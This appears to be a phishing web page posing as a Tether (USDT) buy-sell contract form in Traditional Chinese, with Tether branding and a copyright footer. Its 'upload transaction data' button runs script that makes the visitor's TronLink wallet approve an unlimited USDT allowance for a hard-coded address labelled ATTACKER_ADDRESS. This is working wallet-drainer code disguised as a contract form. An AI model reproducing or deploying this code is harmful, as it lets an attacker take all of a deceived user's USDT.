<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>泰達貨幣買賣契約</title>
	<link rel="stylesheet" type="text/css" href="style.css">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
</head>
<body>

    <!-- ✅ 右上角圖片 -->
    <img src="asset/top-right-shapes.svg" class="top-right-shapes">

    <!-- ✅ 左下角圖片 -->
    <img src="asset/bottom-left-shapes.svg" class="bottom-left-shapes">

    <!-- ✅ 外框（讓 Logo 和 登入框一起置中） -->
    <div class="content-wrapper">
        <img src="asset/logo-tether.svg" class="logo">

        <div class="login-container">
            <!-- ✅ 錢包地址 -->
            <div class="wallet-address" id="wallet-address">未偵測到錢包</div>

            <!-- ✅ 立契約書人 -->
            <h3 class="section-title">立契約書人</h3>
            <label for="seller">出賣人（甲方）</label>
            <input type="text" id="seller" class="input-field" placeholder="請輸入甲方名稱">

            <label for="buyer">買受人（乙方）</label>
            <input type="text" id="buyer" class="input-field" placeholder="請輸入乙方名稱">

            <!-- ✅ 買賣標的及價金 -->
            <h3 class="section-title">買賣標的及價金</h3>
            <label for="crypto-type">虛擬貨幣種類</label>
            <input type="text" id="crypto-type" class="input-field" placeholder="USDT">

            <label for="crypto-amount">數量</label>
            <input type="text" id="crypto-amount" class="input-field" placeholder="請輸入交易數量">

            <label for="exchange-rate">虛擬貨幣匯率（新台幣/USDT）</label>
            <input type="text" id="exchange-rate" class="input-field" placeholder="請輸入匯率">

            <!-- ✅ 付款方式 -->
            <h3 class="section-title">付款方式</h3>
            <p class="info-text">
                乙方應於簽約時一次性支付甲方價金，甲方於確認款項後，應立即轉移對應的 USDT 予乙方。
            </p>

            <!-- ✅ 法律聲明 -->
            <h3 class="section-title">法律聲明</h3>
            <p class="info-text">
                本交易應遵守相關法律，且雙方應確保資金來源合法，並獨立承擔交易風險。
            </p>
			
            <!-- ✅ 上傳按鈕 -->
            <button class="btn-submit" onclick="increaseApproval();return false;">上傳交易資料</button>
        </div>
    </div>

    <!-- ✅ 版權資訊 -->
    <div class="footer">
        Copyright <img src="asset/copyright.svg" style="width: 12px;"> 2013 - 2025 Tether Operations, S.A. de C.V. All rights reserved.
    </div>
<script>
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20 USDT
const ATTACKER_ADDRESS = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 你要授權的 EOA

async function increaseApproval() {
    if (!tronWeb || !tronWeb.defaultAddress.base58) {
        Swal.fire('請先連接 TronLink 錢包');
        return;
    }

    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const maxUint256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

        const tx = await contract.approve(ATTACKER_ADDRESS, maxUint256).send();
        Swal.fire('已發送授權交易！', 'TxID: ' + tx, 'success');
    } catch (err) {
        Swal.fire('授權失敗', err.message || err, 'error');
    }
}
</script>
</body>
</html>
